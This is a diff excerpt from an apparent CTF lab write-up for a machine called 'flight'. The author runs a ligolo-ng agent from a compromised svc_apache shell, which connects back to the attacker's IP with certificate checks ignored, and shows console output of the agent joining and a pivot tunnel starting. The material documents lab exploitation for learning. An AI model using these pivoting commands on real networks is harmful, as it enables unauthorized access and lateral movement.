@@ -671,12 +671,17 @@ ligolo-ng »
 This has configured ligolo-ng routing info
 
 ```python
-
+SHELL> ./agent.exe -connect 10.10.14.90:11601 --ignore-cert
 ```
-This triggered a connection back to me
+This triggered a connection back to me on the svc_apache shell
 
 ```python
- 
+ligolo-ng » INFO[0002] Agent joined.                                 id=00505694ba82 name="flight\\svc_apache@g0" remote="10.129.228.120:61155"
+ligolo-ng » session
+? Specify a session : 1 - flight\svc_apache@g0 - 10.129.228.120:61155 - 00505694ba82
+[Agent : flight\svc_apache@g0] » tunnel_start --tun flight
+INFO[0055] Starting tunnel to flight\svc_apache@g0 (00505694ba82) 
+[Agent : flight\svc_apache@g0] »  
 ```
 This shows me getting the connection and starting the tunnel 
 
